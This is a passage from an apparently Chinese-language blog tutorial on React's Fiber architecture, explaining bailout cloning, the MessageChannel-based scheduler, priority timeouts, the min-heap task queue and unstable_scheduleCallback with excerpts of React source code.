class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">bailoutOnAlreadyFinishedWork</span>(<span class="hljs-params">current: Fiber, workInProgress: Fiber, renderLanes: Lanes</span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-title function_">cloneChildFibers</span>(current, workInProgress); <span class="hljs-comment">// 克隆子树</span><br>  <span class="hljs-keyword">return</span> workInProgress.<span class="hljs-property">child</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键操作：</p><ul><li>子树克隆：直接拷贝 current 树的子链表到 workInProgress 树。</li><li>副作用继承：保留旧 Fiber 的 subtreeFlags（标记子树是否需要更新）。</li></ul><p><strong>性能优化对比</strong></p><table><thead><tr><th align="left">场景</th><th align="left">传统 Diff</th><th align="left">Fiber Diff</th></tr></thead><tbody><tr><td align="left">节点复用</td><td align="left">仅复用 DOM</td><td align="left">状态+DOM+hooks</td></tr><tr><td align="left">条件判断</td><td align="left">无系统化 bailout</td><td align="left">多维度检测（props&#x2F;context&#x2F;优先级）</td></tr><tr><td align="left">子树跳过</td><td align="left">不可能</td><td align="left">直接克隆整棵子树（O(1) 操作）</td></tr><tr><td align="left">时间复杂度</td><td align="left">O(n²)（递归）</td><td align="left">O(n)（map查找+链表遍历）</td></tr></tbody></table><h1 id="第四章：Fiber的调度系统与并发模式"><a href="#第四章：Fiber的调度系统与并发模式" class="headerlink" title="第四章：Fiber的调度系统与并发模式"></a>第四章：Fiber的调度系统与并发模式</h1><h2 id="4-1-调度器（Scheduler）的实现原理"><a href="#4-1-调度器（Scheduler）的实现原理" class="headerlink" title="4.1 调度器（Scheduler）的实现原理"></a>4.1 调度器（Scheduler）的实现原理</h2><p>调度器（scheduler）是 Fiber 架构中并发模式的核心实现。调度器的核心目标有三点：</p><ul><li>任务可中断与恢复</li><li>优先级调度</li><li>时间切片</li></ul><p>React17 及之前版本中任务中断与时间切片的核心逻辑在于浏览器 requestIdleCallback API 的利用，但该 API 有几个问题：</p><ul><li>不可靠的执行时机：requestIdleCallback 的执行依赖于浏览器的空闲时间，但不同浏览器的实现差异较大，且可能被扩展插件、防病毒软件等干扰</li><li>无法保证任务顺序：requestIdleCallback 的回调执行顺序可能被打乱（尤其是设置了 timeout 时），而 React 需要精确控制任务优先级</li><li>兼容性问题：部分浏览器（如旧版 Safari）不支持 requestIdleCallback，或实现不一致</li><li>时间切片需求：React 需要将任务拆分为 5ms 左右的小块，而 requestIdleCallback 无法提供这种精细控制</li></ul><p>React 18 改用 <code>MessageChannel</code> 模拟 requestIdleCallback 的行为，并在此基础上实现更高级的调度策略</p><h3 id="MessageChannel与时间切片"><a href="#MessageChannel与时间切片" class="headerlink" title="MessageChannel与时间切片"></a>MessageChannel与时间切片</h3><p>MessageChannel 是浏览器提供的用于跨文档通信（跨窗口&#x2F;iframe）的 API，也被广泛用于主线程的任务调度</p><p><strong>基本用法</strong></p><p>MessageChannel 创建一个双向通信通道，包含两个MessagePort：</p><ul><li>port1：发送消息</li><li>port2：接收消息</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br><span class="hljs-keyword">const</span> &#123; port1, port2 &#125; = channel;<br><br><span class="hljs-comment">// port2 监听消息</span><br>port2.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Received:&quot;</span>, event.<span class="hljs-property">data</span>);<br>&#125;;<br><br><span class="hljs-comment">// port1 发送消息</span><br>port1.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>特点</strong></p><ul><li>异步执行：postMessage 是宏任务，类似于 setTimeout(fn, 0)，但比setTimeout更高效</li><li>零延迟：浏览器会尽快执行回调，不受事件循环延迟影响</li><li>跨线程通信：可用于 Web Worker、Service Worker 等场景（但 React 调度器仅用于主线程）</li></ul><p><strong>React scheduler 如何使用 MessageChannel</strong></p><p>关键代码（Scheduler.js）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">performWorkUntilDeadline</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (enableRequestPaint) &#123;<br>    needsPaint = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (isMessageLoopRunning) &#123;<br>    <span class="hljs-keyword">const</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();<br>    <span class="hljs-comment">// Keep track of the start time so we can measure how long the main thread</span><br>    <span class="hljs-comment">// has been blocked.</span><br>    startTime = currentTime;<br><br>    <span class="hljs-comment">// If a scheduler task throws, exit the current browser task so the</span><br>    <span class="hljs-comment">// error can be observed.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Intentionally not using a try-catch, since that makes some debugging</span><br>    <span class="hljs-comment">// techniques harder. Instead, if `flushWork` errors, then `hasMoreWork` will</span><br>    <span class="hljs-comment">// remain true, and we&#x27;ll continue the work loop.</span><br>    <span class="hljs-keyword">let</span> hasMoreWork = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// workLoop 循环执行任务直到时间片用尽</span><br>      hasMoreWork = <span class="hljs-title function_">flushWork</span>(currentTime);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      <span class="hljs-keyword">if</span> (hasMoreWork) &#123;<br>        <span class="hljs-comment">// If there&#x27;s more work, schedule the next message event at the end</span><br>        <span class="hljs-comment">// of the preceding one.</span><br>        <span class="hljs-title function_">schedulePerformWorkUntilDeadline</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        isMessageLoopRunning = <span class="hljs-literal">false</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">flushWork</span>(<span class="hljs-params">initialTime: number</span>) &#123;<br>  <span class="hljs-comment">// 省略非关键代码</span><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">workLoop</span>(initialTime);<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-comment">// 省略非关键代码</span><br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// No catch in prod code path.</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">workLoop</span>(initialTime);<br>    &#125;<br>  &#125; <span class="hljs-keyword">finally</span> &#123;<br>    <span class="hljs-comment">// 省略非关键代码</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">initialTime: number</span>) &#123;<br>  <span class="hljs-keyword">let</span> currentTime = initialTime;<br>  <span class="hljs-title function_">advanceTimers</span>(currentTime);<br>  currentTask = <span class="hljs-title function_">peek</span>(taskQueue);<br>  <span class="hljs-keyword">while</span> (currentTask !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!enableAlwaysYieldScheduler) &#123;<br>      <span class="hljs-keyword">if</span> (currentTask.<span class="hljs-property">expirationTime</span> &gt; currentTime &amp;&amp; <span class="hljs-title function_">shouldYieldToHost</span>()) &#123;<br>        <span class="hljs-comment">// This currentTask hasn&#x27;t expired, and we&#x27;ve reached the deadline.</span><br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">const</span> callback = currentTask.<span class="hljs-property">callback</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-comment">// 省略</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">pop</span>(taskQueue)<br>    &#125;<br>    <span class="hljs-comment">// 省略任务队列循环处理逻辑代码</span><br>    currentTask = <span class="hljs-title function_">peek</span>(taskQueue);<br>  &#125;<br>  <span class="hljs-comment">// Return whether there&#x27;s additional work</span><br>  <span class="hljs-keyword">if</span> (currentTask !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);<br>    <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleTimeout</span>(<span class="hljs-params">currentTime: number</span>) &#123;<br>  isHostTimeoutScheduled = <span class="hljs-literal">false</span>;<br>  <span class="hljs-title function_">advanceTimers</span>(currentTime);<br><br>  <span class="hljs-keyword">if</span> (!isHostCallbackScheduled) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">peek</span>(taskQueue) !== <span class="hljs-literal">null</span>) &#123;<br>      isHostCallbackScheduled = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">requestHostCallback</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);<br>      <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestHostCallback</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (!isMessageLoopRunning) &#123;<br>    isMessageLoopRunning = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title function_">schedulePerformWorkUntilDeadline</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// DOM and Worker environments.</span><br><span class="hljs-comment">// We prefer MessageChannel because of the 4ms setTimeout clamping.</span><br><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br><span class="hljs-keyword">const</span> port = channel.<span class="hljs-property">port2</span>;<br>channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = performWorkUntilDeadline; <span class="hljs-comment">// 接收消息后执行任务</span><br>schedulePerformWorkUntilDeadline = <span class="hljs-function">() =&gt;</span> &#123;<br>  port.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 触发异步执行</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>调度流程如下：</p><ol><li>任务入队：unstable_scheduleCallback 将任务加入最小堆</li><li>触发调度：requestHostCallback 通过 port.postMessage(null) 请求调度</li><li>执行任务：浏览器在下一事件循环中调用 port1.onmessage，执行 flushWork</li><li>时间切片：flushWork 每次执行最多 5ms，超时则暂停（shouldYieldToHost）</li></ol><h3 id="优先级标记（Lane模型）与任务队列"><a href="#优先级标记（Lane模型）与任务队列" class="headerlink" title="优先级标记（Lane模型）与任务队列"></a>优先级标记（Lane模型）与任务队列</h3><p>之前章节我们已经学习过优先级载体 Lane 模型的概念，其对应代码定义如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// SchedulerPriorities.js</span><br><br><span class="hljs-keyword">export</span> type <span class="hljs-title class_">PriorityLevel</span> = <span class="hljs-number">0</span> | <span class="hljs-number">1</span> | <span class="hljs-number">2</span> | <span class="hljs-number">3</span> | <span class="hljs-number">4</span> | <span class="hljs-number">5</span>;<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Use symbols?</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NoPriority</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ImmediatePriority</span> = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserBlockingPriority</span> = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NormalPriority</span> = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">LowPriority</span> = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">IdlePriority</span> = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p><strong>优先级与超时时间映射</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> timeout;<br><span class="hljs-keyword">switch</span> (priorityLevel) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:<br>  <span class="hljs-comment">// Times out immediately</span><br>  timeout = -<span class="hljs-number">1</span>; <span class="hljs-comment">// 同步执行</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = userBlockingPriorityTimeout; <span class="hljs-comment">// 250ms 超时</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:<br>  <span class="hljs-comment">// Never times out</span><br>  timeout = maxSigned31BitInt; <span class="hljs-comment">// 最大超时，var maxSigned31BitInt = 1073741823; 约12天</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = lowPriorityTimeout; <span class="hljs-comment">// 10s 超时</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:<br><span class="hljs-attr">default</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = normalPriorityTimeout; <span class="hljs-comment">// 5s 超时</span><br>  <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>任务队列（最小堆）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// SchedulerMinHeap.js</span><br>type <span class="hljs-title class_">Heap</span>&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt; = <span class="hljs-title class_">Array</span>&lt;T&gt;;<br>type <span class="hljs-title class_">Node</span> = &#123;<br>  <span class="hljs-attr">id</span>: number,<br>  <span class="hljs-attr">sortIndex</span>: number,<br>  ...<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> push&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;, <span class="hljs-attr">node</span>: T): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-keyword">const</span> index = heap.<span class="hljs-property">length</span>;<br>  heap.<span class="hljs-title function_">push</span>(node);<br>  <span class="hljs-title function_">siftUp</span>(heap, node, index);<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> peek&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;): T | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-keyword">return</span> heap.<span class="hljs-property">length</span> === <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : heap[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> pop&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;): T | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-keyword">if</span> (heap.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> first = heap[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">const</span> last = heap.<span class="hljs-title function_">pop</span>();<br>  <span class="hljs-keyword">if</span> (last !== first) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-type]</span><br>    heap[<span class="hljs-number">0</span>] = last;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call]</span><br>    <span class="hljs-title function_">siftDown</span>(heap, last, <span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> first;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>任务调度入口：unstable_scheduleCallback</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">unstable_scheduleCallback</span>(<span class="hljs-params"></span><br><span class="hljs-params">  priorityLevel: PriorityLevel,</span><br><span class="hljs-params">  callback: Callback,</span><br><span class="hljs-params">  options?: &#123;delay: number&#125;,</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Task</span> &#123;<br>  <span class="hljs-keyword">var</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();<br><br>  <span class="hljs-keyword">var</span> startTime;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; options !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">var</span> delay = options.<span class="hljs-property">delay</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> delay === <span class="hljs-string">&#x27;number&#x27;</span> &amp;&amp; delay &gt; <span class="hljs-number">0</span>) &#123;<br>      startTime = currentTime + delay;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      startTime = currentTime;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    startTime = currentTime;<br>  &#125;<br><br>  <span class="hljs-keyword">var</span> timeout;<br>  <span class="hljs-keyword">switch</span> (priorityLevel) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:<br>      <span class="hljs-comment">// Times out immediately</span><br>      timeout = -<span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = userBlockingPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:<br>      <span class="hljs-comment">// Never times out</span><br>      timeout = maxSigned31BitInt;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = lowPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = normalPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 计算任务过期时间</span><br>  <span class="hljs-keyword">var</span> expirationTime = startTime + timeout;<br><br>  <span class="hljs-comment">// 创建新任务对象</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-attr">newTask</span>: <span class="hljs-title class_">Task</span> = &#123;<br>    <span class="hljs-attr">id</span>: taskIdCounter++,<br>    callback,<br>    priorityLevel,<br>    startTime,<br>    expirationTime,<br>    <span class="hljs-attr">sortIndex</span>: -<span class="hljs-number">1</span>,<br>  &#125;;<br>  <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>    newTask.<span class="hljs-property">isQueued</span> = <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (startTime &gt; currentTime) &#123;<br>    <span class="hljs-comment">// This is a delayed task.</span><br>    newTask.<span class="hljs-property">sortIndex</span> = startTime;<br>    <span class="hljs-comment">// 将任务插入最小堆（按expirationTime排序）</span><br>    <span class="hljs-title function_">push</span>(timerQueue, newTask);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">peek</span>(taskQueue) === <span class="hljs-literal">null</span> &amp;&amp; newTask === <span class="hljs-title function_">peek</span>(timerQueue)) &#123;<br>      <span class="hljs-comment">// All tasks are delayed, and this is the task with the earliest delay.</span><br>      <span class="hljs-keyword">if</span> (isHostTimeoutScheduled) &#123;<br>        <span class="hljs-comment">// Cancel an existing timeout.</span><br>        <span class="hljs-title function_">cancelHostTimeout</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        isHostTimeoutScheduled = <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-comment">// Schedule a timeout.</span><br>      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, startTime - currentTime);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    newTask.<span class="hljs-property">sortIndex</span> = expirationTime;<br>    <span class="hljs-title function_">push</span>(taskQueue, newTask);<br>    <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>      <span class="hljs-title function_">markTaskStart</span>(newTask, currentTime);<br>      newTask.<span class="hljs-property">isQueued</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">// Schedule a host callback, if needed. If we&#x27;re already performing work,</span><br>    <span class="hljs-comment">// wait until the next time we yield.</span><br>    <span class="hljs-keyword">if</span> (!isHostCallbackScheduled &amp;&amp; !isPerformingWork) &#123;<br>      isHostCallbackScheduled = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">requestHostCallback</span>();<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> newTask;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>unstable_scheduleCallback被调用路径</strong></p><p>unstable_scheduleCallback 主要通过以下路径被调用：</p><ol><li>状态更新：setState、useState、useReducer。</li><li>副作用调度：useEffect、useLayoutEffect。</li><li>并发模式 API：startTransition、useDeferredValue。</li><li>根节点渲染：ReactDOM.createRoot().render()。</li></ol><p><strong>核心调用链路</strong></p><p>以 setState 为例，调用链如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 